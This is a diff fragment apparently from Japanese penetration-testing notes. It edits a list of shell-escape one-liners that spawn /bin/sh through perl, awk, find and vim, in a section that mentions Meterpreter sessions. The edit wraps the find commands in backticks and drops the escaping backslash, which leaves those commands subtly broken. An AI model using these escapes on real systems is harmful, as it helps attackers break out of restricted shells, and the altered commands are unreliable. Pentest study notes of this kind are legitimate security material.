@@ -1831,8 +1831,8 @@ run
 	- /bin/sh -i
 	- perl —e 'exec "/bin/sh";'
 	- awk 'BEGIN {system("/bin/sh")}'
-	- find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
-	- find . -exec /bin/sh \; -quit
+	- `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}';`
+	- `find . -exec /bin/sh ; -quit`
 	- vim -c ':!/bin/sh'
 	- 以下は、スクリプトで書いて実行する必要がある
 		- perl: exec "/bin/sh";
@@ -2939,8 +2939,8 @@ Mesterpreterでユーザー権限でセッションが確立している時、�
 	- /bin/sh -i
 	- perl —e 'exec "/bin/sh";'
 	- awk 'BEGIN {system("/bin/sh")}'
-	- find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
-	- find . -exec /bin/sh \; -quit
+	- `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}';`
+	- `find . -exec /bin/sh ; -quit`
 	- vim -c ':!/bin/sh'
 	- 以下は、スクリプトで書いて実行する必要がある
 		- perl: exec "/bin/sh";
